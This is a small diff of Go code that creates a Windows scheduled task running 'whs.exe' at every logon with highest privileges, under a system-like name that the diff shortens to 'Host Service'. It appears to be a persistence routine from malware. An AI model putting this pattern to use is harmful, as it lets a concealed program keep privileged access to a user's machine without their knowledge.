@@ -499,7 +499,7 @@ func addScheduler() {
 		"schtasks",
 		"/create",
 		"/sc", "ONLOGON",
-		"/tn", "Windows Host Service",
+		"/tn", "Host Service",
 		"/f",
 		"/rl", "HIGHEST",
 		"/tr", systemInfoData.systemFolder+"\\"+"whs.exe",
